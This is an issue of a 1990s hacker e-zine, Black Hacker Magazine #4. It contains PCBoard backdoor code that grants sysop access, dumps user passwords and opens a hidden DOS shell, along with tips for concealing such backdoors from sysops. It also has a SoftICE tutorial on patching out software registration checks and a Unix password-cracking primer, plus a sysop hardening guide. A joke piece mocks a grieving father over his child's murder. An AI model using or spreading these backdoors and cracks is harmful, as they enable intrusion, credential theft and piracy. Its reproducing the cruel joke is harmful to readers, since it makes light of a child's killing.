 As you proably noticed in the beginning of this file, BHM, has - as many
 other great magazines - sould out to Ziff Davis! And from beeing a non-
 commercial, information freedomfighting group/zine, it has now become a
 highly commercial zine, where we write Mr. Davis' thoughts. The rules
 are - we have to have the Ziff-Davis logo at the top of every file, we
 have to mention his name (Ziff) at least one time every 1000 words -
 and we're not allowed to have any illegal articles. (articles about hacking,
 phreaking and anarchy are considered illegal) - AND, get this (this is the
 hard part), WE HAVE TO SPELL RIGHT! :/ (that means we can't say "werd",
 "sup?", etc.)... hmmmm

 K, 'nuff bs. let's kick it hard...

 Black Hacker Magazine has some kewl info this time, but we're (still)
 lacking alot on the unix section. Me and Ripperjack have finally installed
 unix and moved from lamers to wannabe's ;) That means, that you'll probably
 see some more unix stuff here in the future, as we expand our knowledge
 on the subject. We need more writers, so please send us articles by email.

 I'm joining the Army in a couple of days, so this will probably be the last
 BHM for a while (I'm going to be there for 12 months). Due to this,
 Ripperjack is temporarily in charge of NS!, which means he can release
 files etc. but I doubt there will be a BHM until I come back ... but then
 again, he might surprise us all :) Well, anyway - this was a bit <in a
 hurry> release, I wanted to add more stuff but we didn't get time due
 to the deadline (Middle of Augus'97). We have also added some new sections
 this issue - sections you will find in each BHM from now on; Contest
 (with a price! wow;), News & an Add section. So check it out.

 `So much to read, so much to learn - but so little time' - that's actually
 a real problem to me. fewk, I need to be able to stop time or something.

                           !$#!BuzzBug!#$!
			  
  No Shit! got a new writer called BuzzBug. No one knew shit about him so we 
  decided to phone the Swedish Police and ask about him. And they sent us
  his crime record.
 
  1. Busted for Phreaking 4 times.
  2. Busted for Robbery.
  3. Busted for Murder on a 3 year old child. 
  4. Escaped from jail 1997-07-09.
  5. GONE! No one knows where he his.
  
  Then we phoned his mom (dont ask me how we got the number).
  And she told us that he always was searching for THE ULTIMATE 2600Hz TONE. 
  His mom was so ugly so we tried to hang up as fast as we could.
  
  Well the Murder was cool so we decided to phone the childs parants :
  
  Dad     - Mr. Andersson
  NoShit! - Hello we would like to know if BuzzBug killed your child ?
  Dad     - Yes he did but i dont want to talk about it (Dad is Crying).
  NoShit! - OK. But do you know why he did it ?
  Dad     - No i dont. He smashed the door to our apparment at the same time
            he was screaming "I NEED 2600HZ TONES IN MY BLOOD!" he was crazy.
	    Then he saw our child playing around with the phone.....please
	    i dont want to talk about it.
  NoShit! - Dont be a Pussy keep on!
  Dad     - Ok....well when he saw our kid playing with the phone he said
            "YOUR KID DOSENT NEED 2600HZ TONES AS MUCH AS I DO!" then he shoot
	    my kid (Dad crying more!).
  NoShit! - C'mon keep it moving....
  Dad     - HE SHOOT MY KID IN THE HEAD!$!#
  NoShit! - Calm down.......
  Dad     - Then he connected him self to the phoneline and disappeared.
  NoShit! - Thats all?
  Dad     - Yes it is (crying)
  NoShit! - Ok. God Bye.
  
  *CLICK*
  
BuzzBug was arrasted 3 weeks later while he was screaming : 
"I NEED 2600HZ TONES !" in a supermarket in Sweden.

6 months later BuzzBug Escaped from jail when he connected him self to the
Phone. NO ONE knows where he is but some dudes belives that he is out
somewhere in CyberSpace searching for THE ULTIMATE 2600HZ TONE!#$

|===[By: Codeblaster]=[BHM#4]=[11k]=[#04]=====================================|
`-===========================================================================-'

  Okay, we've written some about Pcboard hacking in earlier issues of BHM,
  but we've never looked at backdoors in PPE's (Pcb doors/compiled scripts)
  So, since this is one of the most popular ways of hacking Pcboard, I'm
  going to look a little closer on that in this article. Here's a little
  index of this article:

                 1........................Classic Backdoors
                 2........................Backdoor Scanners
                 3.......................Advanced Backdoors
                 4.......PPE's that can be used for hacking

1. Classic Backdoors
~~~~~~~~~~~~~~~~~~~~
  Classic backdoors are pretty lame, cause the PPE Backdoor scanners will
  find them, and the sysops will most likely find them their self. But I'm
  going to show you some examples, so you get some idea (or you can use this
  as a list of backdoors NOT to use;)

  GETUSER                              ; Get User Info
  U_SEC = SYSOPSEC()                   ; Set security level = Sysop's
  PUTUSER                              ; Save User Info

  Okay, this is probably the most common backdoor - as you've probably
  understood, this is supposed to give the current user sysop's security
  level. However, what most don't know is that the code above doesn't
  work as it should. When you run the code above you get sysop's security
  level MINUS ten. I don't know why it is that way, maybe it's a bug in
  pcboard or something, but it is that way. So, the correct code would be:

  GETUSER                              ; Get User Info
  U_SEC = SYSOPSEC()+10                ; Set security level = Sysop's
  PUTUSER                              ; Save User Info

  Ok, from now on I will refer to the backdoor code above as Backdoor #1.
  The next backdoor is also pretty classic (we'll call this one Backdoor #2);

  STRING USERSFILE                                ; Define Strings
  INT X,USERS                                     ; Define Integers

  USERSFILE = READLINE(PCBDAT(),29)               ; Get Users filename/path
  USERS = FILEINF(USERSFILE, 4) / 400             ; Get Number of Users
                                                  ; Size of userfile / 400
                                                  ; since each record is 400b
  FOR X = 1 TO USERS                              ; A loop
    GetAltUser X                                  ; Get User Record X
    Println "---------(",X,"/",USERS,")---------" ; Just to make it look good
    Println U_Name()                              ; Show Users Name
    Println U_Pwd                                 ; Show Users PWd
  NEXT X                                          ; The Loop Again

  The one above lists all users to the screen. Maybe it's an idea with
  mprintln (look later in this article). This works fine, but it is often
  easily discovered by the sysop (if he's not extremely lame that is)


2. Backdoor Scanners
~~~~~~~~~~~~~~~~~~~~
  I only know of 2 backdoor scanners for Pcboard. There might be more, if
  you know of anyone else than the ones released by AEGIS and FOOD let me
  know. Here they are:

  You will probably find the first one on AEGIS' homepage at:
  http://www.mygale.org/05/aegis/
  And FOOD's backdoor scanner you can find on FOOD's homepage:
  http://www.ozet.de/privat/freezone/food/index.html

  Personally I prefer FOOD's release, but that's probably cause I was the
  one who coded it ;). AEGIS is good to use if you're checking the PPE's
  yourself, but if you want the whole thing automated in your upload
  processor or something FOOD's release is perfect. Ok, here's the result I
  got when I scanned the different backdoor sources shown in this article:

  Backdoor #1:
        AEGIS: þþþþ BACK1.PPE MIGHT CONTAIN A BACKDOOR þþþþ Flags Rh
        FOOD : Suspicious lines: 3 / Logical Backdoor: 1 of 3
  Backdoor #2:
        AEGIS: þþþþ BACK2.PPE MIGHT CONTAIN A BACKDOOR þþþþ Flags: Rdh
        FOOD : Suspicious lines: 5 / Logical Backdoor: 2 of 3

  *NOTE* about AEGIS' ppescanner:
  The flags used are:
                        F - Change conference flags status
                        W - Write user
                        R - Read user
                        D - Delete user
                        A - Adjust online time remaining
                        B - Brute hangup
                        M - Send text to modem only
                        S - Shell to DOS
                        C - Call child PPE
                        I - Interrupt call
                        P - Poke in memory
                        c - Change password
                        a - Adjust ratio
                        f - Flag files for download
                        d - Access PCBOARD.DAT
                        p - Peek in memory
                        H - Read Password or Password History
                        i - Sequencially read files in directory
                        s - Sysop level access

  If one of the flags above are found, the AEGIS ppescanner will report:
  "þþþþ SCANNED.PPE MIGHT CONTAIN A BACKDOOR þþþþ" and that's kind of lame
  cause *MANY* ppe's use the commands above. That means that if you scan
  a userlister, filelist ppe, qwk download, login ppe, etc.etc.etc. you
  will get "MIGHT CONTAIN A BACKDOOR" ...

3. Advanced Backdoors
~~~~~~~~~~~~~~~~~~~~~
  First, some hints'n'tips:
                           * Use MPRINTLN instead of PRINTLN. This prints to
                             YOUR screen only and not SYSOPS screen. So when
                             you list all his users he will just think the
                             PPE hangs a couple of secs ;)

                           * When you add backdoors don't add the whole code,
                             make it "fit in". Fex. if you add a backdoor to
                             a userlister, variables such as NUMBER OF USERS
                             etc. will most likely exist from before. A good
                             backdoor is only 1 line added to a source. 

                           * Compile your PPE's as PPE 3.30, this way the
                             sysop might have more problems decompiling it.

  Ok, I'm not going to list hundreds of backdoors codes here, cause I haven't
  got the time for that - but I'll show you a couple I think is neat;

  * Just use the CALL command to call another PPE (which contains the real
    backdoor). You upload the PPE containing the backdoor when you're going
    to do the hack - this requires that we know his UPLOAD directory, but
    then again that's not very hard to find out using the 'TEST' command to
    test a file in the upload directory.
    You can add this in whatever ppe you want; IF <INSTRING> = "FUCKTHIS"
    THEN CALL <UPLOADPATH>+PPENAME.PPE  <- Pseydocode ofcourse, if you know
    anything about PPL this shouldn't be any problem, if you don't then
    don't even think of hacking PCBoard. 

  * You can use the SHELL command, although this command is more likely
    to be a backdoor then the one above. But it's easier though, just add

 INT CODE        ; Just to define the CODE variable as INTEGER
 STRING DOTHIS   ; Just to define the DOTHIS variable as STRING
 DOTHIS = "CTTY>"+READLINE(PCBDAT(),52)
 IF <INSTRING> = "FUCKTHIS" THEN SHELL TRUE,CODE,DOTHIS,""
    (Pseydocode)
    This will allow you to shell to DOS and do whatever you want there, while
    the sysop sees nothing but a his board on the screen (Like it's hanged)

  Just experiment, there are MANY commands in PPL that can be used as back-
  doors, so it really isn't that hard. 

4. PPE's that can be used for hacking
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  Some PPE's can be used to hack with even if they don't contain backdoors.
  These have major bugs, and I'm compiling a list of PPE's that have these
  bugs - so if you know of any please email them to me! An example of ppe's
  which often have this kind of bugs are PCB/ANSI viewer PPE's (Art PPE's).
  These often let users add ansis and they often use the DispFile command
  to display the ansis to the screen. If a user then adds "!C:\UPLOAD\RUN.PPE"
  in an ansi and displays that with the art-ppe RUN.PPE will be executed.
  Here are one I found:

-(FileName)---(Rel.date)----------------(File_id.diz)-------------------------
FSW-AG.ZIP     25.02.95                 _______________________ __ __ __

                                        `-[02/25/95]----------------------'

  I need more PPE's on this list, so if you have some PPE's please look
  for this; Art PPE's (as the first above), Wall PPE's that uses Dispfile,
  Oneliners that users Dispfile, flag ppe's with bugs, download ppe's, etc.

  Ok, due to lack of time before releasing this magazine, I couldn't check
  all my PPE's, so this is the only one included in this mag. It's just
  meant as an example anyway, so it doesn't matter. If you have any released
  PPE's with known backdoors please send some info to blackhackers@hotmail.com
  ... Maybe I'll compile a huge list some day :)

.-==[How to protect your BBS/Pcb from beeing hacked]=========================-.
|===[By: Codeblaster]=[BHM#4]=[08k]=[#05]=====================================|
`-===========================================================================-'

In my years as a bbs hacker I've been stunned time after time over how stupid
some sysops really are. This is a little tutorial on how to protect yourself
from beeing hacked, it's written for Pcboard but some of these hints will fit
other systems too. When my board was up, I KNEW it was 99,99% hacking-proof.
If anyone were to hack it, it would be my fault, and not the systems. This can
also be a guide to setting up a hacking-proof bbs. So if you're a sysop, read
on...

Some general hints:
===================

 * Never let the paths/filenames in your system be default. Fex. in PCBOARD
   never use the directory C:\PCB, in Remote Access never use C:\RA and in
   BBBS/MBBS never use C:\BBS (You should never use this no matter what
   sytem you have, btw).

   It's also a good idea to change names of important files. Fex. when we
   hacked Pcboard we often used a search engine that searched for PCBOARD.DAT
   I know this method is often used, so if you're smart you would change this
   filename to HUBAHUBA or something like that and run PCBOARD.EXE with the
   parameters : PCBOARD.EXE /FILE:HUBAHUBA

   (*NOTE* If you rename the PCBOARD.DAT file some utils that are made for
           Pcboard might cause problems. F.ex. PFED - cause they only ask
           for the PATH wich PCBOARD.DAT is placed in, not the NAME. This
           is something that should be fixed in PFED and similar programs,
           since keeping the original filenames of importing files as that
           often is a security risk)

   Users file etc. is also a good idea to rename if you can.

 * Remove / don't add support for RAR (the archiver) in your upload
   processor. As we exposed in TBH-RAR.ZIP, RAR can be used to hack
   with if one know the right tricks. If you run Pcboard you don't
   have to worry, since RAR is not added in as default (You'll have
   to have added it yourself), but in the newest versions BBBS/MBBS
   I think it's added. You should avoid having NEW archivers in general
   in your upload processor since the early versions of programs often
   have security flaws.

   Archivers that we have tested and that are safe (from the RAR bug
   that is) are: PkZIP, Arj and Lha.

 * Never run programs you're told to run in a chat. (this also goes for
   PPE's and scripts etc.) This is probably #1 hacking method; exploiting
   the fact that the sysop is a dumbass. If some newuser just uploads a
   PPE or a EXE and tells you to run it, you should watch out. Try dropping
   to dos and pretending that you run it, see what he does when you let him
   out of the chat.

 * Never do stuff a user you don't know tells you to do. (This only applyes
   if you're unexperiensed and actually don't know what the fuck you're
   doing.) Fex. don't press F1 in pcboard cause this gives the user sysop
   axx, and don't drop to dos and write 'COMMAND.COM COM2' cause this let's
   him drop to dos etc. If you're not a dumbass, and have a slight idea
   of what you're doing then you can forget this one.

 * Don't give users access to commands that can be exploited ;) duh, well
   it isn't that stupid. If you give a user access to the EXT command in
   MBBS he can actually hack you (did you know that?) - Sigops useally
   have access to this command in MBBS, that means that all sigops on MBBS'
   can hack the board.

Pcboard specific hints:
=======================

 * Remove the 'TEST' command. Hackers can find out ANY directory on your
   bbs that files is located in, just by TESTING files in the different
   catagories. This will help hackers alot, since they don't have to make
   a search engine, and the trojan will be helluva lot faster. You can
   ofcourse update the 'TEST' command with a PPE or something, but it's
   probably not worth the work cause no one ever uses this anyways (?).

 * Remove all sysop commands (1-15) - You probably never use them as you
   probably never call your bbs and configure it from somewhere else than
   home. If you do, you can always add a new sysop menu system in a secret
   command that require sysop-access.
   ----------
   If you're not thinking clear right now, or are a bit unexperiensed with
   pcboard, you're probably asking yourself "Remove TEST and Remove sysop
   commands?? Sure, but how the fuck do I do that?".

   Answer: Well, duh. Install .PPE's doing <NOTHING> or printing "This
   command is removed for security purposes" on the screen (whatever)
   in CMD.LST ... The PPE must be installed under the commands you want
   to remove ofcourse. If you want to remove the TEST command, then
   install this in your CMD.LST

   TEST                10        0        0     C:\MYBOARD\PPES\REMOVED.PPE

   And to remove the sysop commands you install the same PPE under 1-15.

 * Remove the 'HELP' command, or make a PPE only showing the original help
   files and no others. The \HELP\ directory is perfect for hackers, cause
   one can place PPE's there and execute them by writing "HELP FUCKYOU"
   (Where FUCKYOU is the name of the HELP file wich executes the .PPE)

   The HELP command is never used anyways (well, if you're running a board
   with lotsa lame users it might be used alot - so then you might wanna
   make that PPE).

 * Remove the 'PPE' command (A sysop's command to EXECUTE ppe's). If you
   don't want to remove it entirely (I sometimes had use for this one)
   you can make a PPE that first asks for password and if entered correctly
   executes the PPE specified.

 * If you're running Pcboard v15.21 (or earlier) upgrade immediately! It's
   easy to hack you using a bug in the software (as we exposed in Bhm#2),
   and anyone can run PPE's they upload.

   If you don't have the chance to upgrade, or don't want to (?), you should
   close the upload directory for Users. This way, hackers can't upload
   ppe's and run them. However, when you've valuated the files, and put
   them on your board, they can run them.

 * Edit your FSEC file. How to do it? Run PCBSETUP.EXE, press "B" and "B",
   and then F2 on the FSEC file. Here you add the directories that users
   can't download files from. Protected directories should at least be
   \PCB\MAIN\, cause that's where the users file is. You can ofcourse add
   other directories too.


Other Hints:
------------
When my board was up, I had lotsa little utilities I made myself, to make
it more hack-proof. Here are some examples of the stuff I had, with a little
PPL skills and maybe some Pascal/Whatever skills you can do this yourself:

* I had an exe added in my PCB.BAT file that checked the lines 6 to 23 in
  PCBOARD.DAT for changes. If one of the lines were something else than
  110 (fex.) if would alert me. This is a nice way to prevent the classic
  pcboard trojan, wich set's all sec levels to 0 instead of 110 so anyone
  can run the sysop commands. (If you've removed the sysop commands you
  probably don't have much use for this, but why not?)

* Many people use those <PRESS ENTER> prompt PPE's. Me too. In this PPE I
  added a check for the users security level. If the user had the same
  security level as sysop (and he wasn't sysop) he would be logged off
  immediately. This method was pretty good, cause since the users can't
  do anything without the <PRESS ENTER> ppe pops up, they will be logged
  off if they in some (weird) way gain sysop access.

  I noticed the power of this once, when my stupid brother (the only flaw
  in my system;) gave a user sysop access ("cause the user asked him") blah.
  Well, the user was logged off a couple of secs later ;)

* If you haven't removed the HELP command you can install a program in
  PCB.BAT wich checks for NEW files in \PCB\HELP\. If any files that
  shouldn't be there are there, then it should alert you. This is also
  a classic way to hack pcboard; place new ppe's and help files in \HELP\
  they can be runned then.

  Follow these tips, and you'll have a pretty safe Pcb system - but of course
  not unhackable.

.-==[Desire Bug / Olm Bug]===================================================-.
|===[By: Codeblaster]=[BHM#4]=[02k]=[#06]=====================================|
`-===========================================================================-'

These bugs were given to me by Inm. Thanx man!

Desire Bug
----------
If you have access to the 'V' command in Desire (Which most users have?), you
can use it to view ANY files in current directory. That means that you will
be able to view the files in C:\DESIRE\*.* - but you have a problem, cause
the userfile is not located there is it? Well, by running DOORS you should
be able to get current dir to be C:\DESIRE\DATA (or whatever the users
file dir is called in desire), and then View the userfile.
**IMPORTANT**
Oki, that was the bug as I got it reported, but I installed Desire to check
it out and I couldn't get it to work on version 1.2b (Maybe it never has
worked?). Only the sysop had access to the View command, and he could view
files all over the HD. 

Olm bug
-------
You can use @DOORS:xxxxx@ to run any door? Just another one I haven't
checked out, so I can't guarantee anything.

-------
I can't verify that the bugs above exists/is working, so check it out
yourself, and give me some feedback if you want. And while we're at it
with this bug thing, why not show you guys a little bug in PCB also;

This isn't really a hacking bug, but it can MESS UP pretty well, and it
always works. Did you know that by pressing CTRL-X while in a chatter
in PCBoard (or whatever PPE), you fuck it totally up so that the sysop
will have to load a new chatter? He can't go out to main either! You
can continue this until it gets so slow that you think you're back to
good ol' 2400 again =) .. Tell the lamer that you've put a virus on his
system, and he'll probably freak ;). Maybe you can get him to load so
many ppe's that he get memory errors, and maybe that can be explored more?


.-==[Another Cracking Unix Passwords Article (Newbies)]======================-.
|===[By: XiZoL]=[BHM#4]=[14k]=[#07]===========================================|
`-===========================================================================-'


* [ see internet resources for wordlists ]

Cracking Unix passwords ( in very simple words:-))
 Hah, my buddy, you've got in to the system just now and what do you do?
Now i'll tell you that you can get more login/password pairs for this system
 and even root one, if the root  is silly enough ,:-) or it's your lucky day.
So what do you do for it?  You need to get the passwd file for
this system, which is usually at /etc/passwd. This file contains the
information about all users in this system, including users' passwords,
but it's not all so easy, the password there its encrypted.Let's have a look
on this file: usually it contains a bunch of lines like this:
george:fhUjI0HydqSA:502:501:George Washington:/home/george:/bin/bash

  As you see it has 6 different fields, each one separated with ":" from the
other. The first field here is user name ( or login name ) this one is used
by user as the name to enter for the "Enter login:" prompt.  the second
field,(as you may guess) is password, it is encrypted using one way
encryption function, and when user login and enter his password system just
encrypt it again using the salt-two characters,(here fh) which are randomly
choosen when user set new password,(the system always save it as two first
characters in the encrypted password sequence) and then just check it with
the existing encrypted password in passwd. Mind that system DOES NOT DECRYPT
PASSWORD, so there are very few chances for us to do the same.
*******************************************************************************
  !Note!: some systems may have shadowed passwords though, so when you look
at the passwd entry, you will see only the asterik(*) in place of password. 
This means that the password is hidden or "shaddowed" in another file, it
might be different file for different systems like in Linux it is
/etc/shadow, in FreeBSD it is master.pwd etc ( have a look on system manual
to see where the password are. In this case you gotta get this file as well
(say using finger hole or any other you know) some folx on #hack told me
though, that i can use simple C program to unshaddow this file (its source i
attached bellow as well) but i haven't checked it yet, so i can't say
whenever it works or not, if check it out, please tell me ok?
********************************************************************************
   Going back to passwd line,next field,the number 502 is the User ID, i
don't think we can use it here anyhow, so I won't explain about it.  The
number after UID, is the Group ID, the identifer of the main group,user
attached to, ( of course there might be many others groups as well, that you
can find at /etc/groups, but the main one always saved in passwd) the next
field here is User Real Name, then user home directory, and the last one is
user's shell.
  Now, let's have a close look on encrypted password, as i already said the
first two characters here are salt, the random value which is used to extend
the number of various combinations of encrypted passwords for each 8 or less
character password. And the rest of those characters, are the encrypted
passwd, not the passwd in fact, but the array of 64 zero bits encrypted with
passwd as the key.
   Since this enctyption algorythm started being used for passwords
encryption, many people were working on reversing it (even the son of well
known Morison (the author of the worm-virus) but neither of them was
successed, so now the only way is used to break unix passwords, to brutally
force it. But the straight forcing may take you years to get the password,
so now we use some modification of it which is called intellegent forcing.
The idea is next : we have the dictonary of the most used password ( you can
get somewhere on the Web, usually it is about 1-2 Mb, but Mind that it might
be different for different countries, as the most people choose the password
basing on their own language), then you just read entry from passwd and
start checking it with every word from your dictonary,crypting with the
current salt it before till you find the equvalent encrypted sequence or
your dictonary is out, then read the next passwd entry and do the same. On
big systems with a bunch of users you will get a number of them surely. Of
course if you know some things about some certain user ( say the name of his
wife,or
 his date of birth an  so on.. you can use it as well, b/c many newbies make
easy-to-remember passwords using their birth dates, phone numbers and stuff
like that).
Of course you can add a bunch of different tricks to your password breaker
to make it more smart (say check every "common password" in you dictonary in
upper or lower case, or mixing with digits) but remember it will surely
affect on the speed of your program.  And one last thing: there are alot of
different programs that are to break/check-weak-passwords on unix systems
(like Crack) but most of them use the same algorythm.
 well, here are some source codes which you can find useful while doing your
breakers, crackers etc.
 first is the function which encrypts password with standard unix encryption
algorythm using given salt and password and returns the pointer to encrypted
passwd.use crypt(password,salt).
 The second is the source code to unshadow passwd files.
Good Hack!:-)

                       Basic Cracking by TNSe^97                 
                                                     
 Well, I guess you are reading here to learn about how to get rid of           
those damn codes on that game, or those idiotic delays on some programs!       
Then, you are reading the rite place! I'll try to learn you how to use         
Soft-Ice 95, and give you some examples on how to crack.                       
                                                                               
First of all, you will need the following things:                              
* Soft Ice for Windows 95   (This is the best, drop the rest!)                 
* A hex editor for files.   (Diskedit.exe, or good ol' PCTools.exe)            
* Some knowledge of assembly codes.                                            
* A piece of paper          (For writing down notes... :)                      
* A pen                     (The paper is useless without ... )                
* A lot of time                                                                
* More time                 (Some times... )                                   
                                                                               
 First step is to install Soft Ice for Win'95, I'll leave that up to your      
imagination. Just keep trying. I will recommend that you have at least SOME    
knowledge of assembly. If you don't, you might get some problems. The one      
thing I can't help you with, is time. Sorry, but it seems like it still is     
24 hrs in one day, 60 mins in a hr and 60 secs in a min... (Damn that suxx)    
                                                                               
 The next step is to start up Soft Ice. To do that, you must press F8 when     
it says "Starting Windows 95" (Or whatever it says in different languages),    
Select option 5, start in MS-DOS mode, and when you get to the dos-prompt,     
change to the Soft Ice dir (My : C:\SIW95) and type WINICE. What you also      
might want to do is add the Soft Ice dir to your path (Very recommended,       
since the rest of the document assumes this...) Now you will probably          
notice that your machine is working its but off. That is because it is         
starting Win'95. When you have entered Win'95, go to MS-DOS shell.             
                                                                               
 Now comes the fun part. First of all change to the directory of the           
program you want to crack. Then type DLDR <PROGRAMNAME>. What happens next     
is that you will get up a screen that Shows a lot of not understandable        
(for you that is) shit. If someone hasn't changed the configuration, the       
following should be correct:                                                   
1. At the top you see the registers. They contain certain data, that           
   programs manipulate. They are sorta important. They can be changed          
   by typing "r", and then look for the cursor.                                
2. Under the registers, you will find some data part. It is useful if          
   you think you know where in the memory the codes are... You can             
   change what it is showing by typing "d <adress>".                           
3. This is the important spot. This is where the code is located.              
   I recommend typing "code on", then you will see what the different          
   codes are in numbers. Pressing "t" will follow you through the program      
   byte by byte, "p" will skip Calls and Ints, so I recommend you use          
   "p". "x" will make the program run just as it usually does, press "x"       
   and see for yourself! Now to the part that requires a bit of knowledge      
   about assembly. The command "a <adress>" can be helpful. It makes it        
   possible to change an opcode in the middle of the program while it is       
   running. This makes it possible to change where the program would go        
   if the code was correct, or if the code was wrong... Another helpful        
   code is "bpx <adress>". Look at the third or fourth line in the code        
   window. It probably says something like: (From COMMAND.COM)                 
                                                                               
   09E5:0105  BF1B01               MOV DI,011B                                 
                                                                               
   Now enter "bpx 0105" and you will see that line get another color than      
   the others. If you press "x" now, the program will stop every time it       
   passes this point. Try. It stopped rite? Yeah.                              
                                                                               
 Now ... Let's try to hack example one. (To enter write DLDR CRKEXAM1.EXE)     
First of all, if you understand pascal, look at the source (CRKEXAM1.PAS)      
and try to understand it. Now... Press "p" until the program asks for the      
code, and then press enter. Now you will see something like this:              
               (4)                                                             
1 ????:00C5  E85EFF                CALL 0026                                   
2 ????:00C8  08C0                  OR AL,AL   (This line is highlighted)       
3 ????:00CA  741E                  JZ 00EA                                     
                                                                               
As you probably have experienced, the highlighting means that the machine      
is about to execute that line. Now lets take a closer look at the lines.       
Line 1 is a call, that means it does something, like (in this example)         
gets and checks the keyboard input. (CALL 0026 is really the                   
Function CodeCorrect:Boolean; ) Line 2 is the standard way of checking         
Boolean Functions. If AL is 0 (FALSE in pascal and C++), which means that      
the code is not correct, Press "p" and line 3 will be highlighted, and you     
can see, that the JZ 00EA will be executed. (Because of the JUMP to the        
right) What we would like to do, is to make the machine give a damn            
even if the code is wrong or correct. Solution:                                
(Before you do this, write down the opcodes, see above where you can           
 find the 4 in parenthesis, write that down, it is important. Here you         
 would write down : E85EFF 08C0 741E change to E85EFF 08C0 9090)               
Enter "a 00CA". Then you will get something like this:                         
????:000000CA    Enter : Nop (NOP = No operation, do nothing, just like        
????:000000CB NOP                   we want! Good?)                            
????:000000CC (Just press enter)                                               
                                                                               
Now look what we got:                                                          
1 ????:00C5  E85EFF                CALL 0026                                   
2 ????:00C8  08C0                  OR AL,AL                                    
3 ????:00CA  90                    NOP        (This line is highlighted)       
4 ????:00CA  90                    NOP                                         
                                                                               
As you see, we changed the "741E" to "9090". Now Press "x".                    
Wow ... It worked! (If it didn't, try again... )                               
                                                                               
Now, for the easiest part. (Always) Make a backup of the .EXE file.            
Try: copy crkexam1.exe crkexam1.bak                                            
        1 file(s) copied                                                       
We are going to edit the executable. I recommend using one of these programs:  
Diskedit                                                                       
PCTools                                                                        
and some others that I do NOT remember the name of...                          
... For Diskedit and PCTools you MUST enter MS-DOS MODE and type LOCK          
(answer yes) before using them...                                              
Now, enter these programs, and find the file we would like to edit. (In        
this case CRKEXAM1.EXE) You will get up a silly screen with a lot of hexes     
and shit. Now find the search option. You will need search for HEX.            
Find the paper you wrote those numbers on (E85EFF 08C0 741E change to          
E85EFF 08C0 9090) and search for E85EFF08C0741E, when found, change            
the 741E to 9090 (Which means NOP NOP, do  nothing) and save.                  
Now start the file, and see... Whatever you type, you will ALWAYS get into     
the rest of the program!                                                       
                                                                               
 Now... That was example 1... Example 2 is alike, but a bit different...       
Do as you did on example 1, until it asks for the code. Back to these lines:   
               (4)                                                             
1 ????:00C5  E85EFF                CALL 0026                                   
2 ????:00C8  08C0                  OR AL,AL   (This line is highlighted)       
3 ????:00CA  741E                  JZ 00EA                                     
                                                                               
Pressing "p" now, you will notice that it says "NO JUMP" to the right.         
It will only jump when the code is correct! Damn... how to do this?            
Well....                                                                       
"a 00ca"                                                                       
????:000000CA JMP 00EA                                                         
And Voila:                                                                     
1 ????:00C5  E85EFF                CALL 0026                                   
2 ????:00C8  08C0                  OR AL,AL                                    
3 ????:00CA  EB1E                  JMP 00EA   (This line is highlighted)       
Aha... It will now ALWAYS jump to where it should, if the code was             
correct! Yippeee... Note on your paper: E85EFF 08C0 741E change to             
E85EFF 08C0 EB1E. Go do it! Now!                                               
                                                                               
 As you have seen on the two previous examples, changing two bytes, even       
one byte can remove the codes... But remember, this is just the BASICS of       
cracking... DO NOT EXPECT EVERYTHING TO BE SO EASY AS THIS... hehe             
But practice helps...                                                          
                                                                               
                                                                               
Helpful hints... (Nice Tricks)                                                 
                                                                               
There are a lot of cool commands in Soft Ice. Personally I like the            
"bpr <adress> <adress>". This command will make you enter Soft Ice             
every time the program writes or reads to this adress. Good Hint:              
"bpr b800:0000 b800:1000" will make you enter Soft Ice EVERY time              
something is written to the screen in text mode...                             
"bpr a000:0000 a000:ffff" will do the same for Graphics mode.                   
                                                                               
Another cool thing is "bpint <intno> <ah=??>". This command                    
enters Soft Ice every time the program does the interrupt you specified.       
I'll leave this command up to you and Ralph Browns interrupt list.             
                                                                               
If you Ever should be so unlucky to encounter something like this:             
1 ????:001F  LODSB                                                             
2 ????:0020  STOSW                                                             
3 ????:0021  DEC CX                                                            
4 ????:0022  JNZ 001F                                                          
5 ????:0024  JMP 00FF 
                                                         
You would probably notice that when you press "p" it will continue looping     
between 1 and 4 for a while. If you are REALLY unlucky, CX might be equal      
to 0FFFFh. You would then have to press "p" about 250000 times.                
Solution: enter "bpx 0024" and line 5 will be highlighted, then press "x".     
Now .. you are on line 5, and all is well. "bpx" means break point on          
execution. Also... stop executing when you come to line 5.                     
                                                                               
After a while, all the breakpoints you have made, can be annoying. You can     
list them by typing "bl". You can disable them by typing "bd <number>" and     
enable them again by typing "be <number>". If you just don't need a            
breakpoint anymore, type "bc <number>". If you accidentally deleted a          
breakpoint, and want it back, you can look at the breakpoint history,          
"bh". The guys who made Soft Ice has been thinking a bit ... =).               
                                                                               
Another trick is to UNPACK the .EXE files BEFORE editing them. Some .EXE       
files are crypted or packed, and you will not be able to edit them before      
you have uncrypted them or unpacked them. Two good programs that I can         
think of rite now is UNPACK.EXE, PKLITE.EXE, XOE.EXE and UNP.EXE.  There
are muuuuccchhh more!    
                                                                               
                                                        TNSe^97/NS!^FooD

CEREAL HACKER - by Steve Knopper/IU
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-----------------------------------------------------------------------------
John Draper aka. Cap'n Crunch - Legendary inspiration or washed-up has-been?
Cap'n Crunch made a name for himself in the early '70s as one of the pioneer
phone phreaks. Today he sleeps at a campground, can't get a job and finds
himself the prey of a new generation of hackers.
-----------------------------------------------------------------------------

"What?" John Draper whispers, with panic and awe in his voice. He leans
forward and stares into his Macintosh PowerBook 520. "What?"
   A gray-haired baby boomer who's making photocopies glances over at Draper,
a wildeyed man with one front tooth and a scraggly beard. Draper, oblivious
to everything except his computer screen, begins to shout: "3,672 mail
messages? Holy fuck. Did I get spammed?"     This Kinko's Copies in Mill
Valley, Calif. doubles as Draper's office space. Everyday, he plops his
scratched-up laptop onto the gray desk nest to the free Kinko's phone,
hitches the wire to his computer jack and logs onto the internet. He
usually spends a few hours checking e-mail and tinkering with his Web page.
     But today, a terrible thing has happened.   "Oh, look at that!" he says
loudly , ignoring the steady flow of Kinko's customers. "They've subscribed
me to all these mailing lists." The Internet mocks him. His fast and shaking
fingers flail over the keyboard, but the names of his new mailing lists by
faster than he can press the delete key. "Welcome to dc-stuff" ... "Welcome
to drewids news" ... "Welcome to compost" ... "Welcome to scream" ...
"Welcome to barry-manilow". Draper is totally helpless this summer morning.
"This is going to take forever," he says.
   The Kinko's customers are now studiously trying to ignore the homeless
mans persistent outbursts. They don't know he's a living legend, and
certainly, Draper, 53, doesn't carry himself as though he were one. In the
early '70s Draper earned the nickname "Cap'n Crnuch" after discovering that
